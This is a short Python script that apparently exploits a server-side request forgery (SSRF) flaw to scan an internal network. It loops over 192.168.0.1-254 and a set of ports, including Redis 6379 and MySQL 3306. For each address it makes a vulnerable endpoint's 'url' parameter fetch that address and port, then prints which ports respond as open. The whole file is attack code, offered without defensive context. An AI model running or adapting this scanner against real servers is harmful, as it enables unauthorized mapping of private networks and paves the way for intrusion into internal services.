# coding:utf-8
import requests
import time

ports = ['80', '6379', '3306', '8080', '8000']
session = requests.Session()

for i in range(1, 255):
    # 内网ip地址
    ip = '192.168.0.%d' % i
    for port in ports:
        url = 'http://ip/?url=http://%s:%s' % (ip, port)
        try:
            res = session.get(url, timeout=3)
            if len(res.text) != 0:
                print(ip, port, 'is open')
        except:
            continue
print('Scan finished.')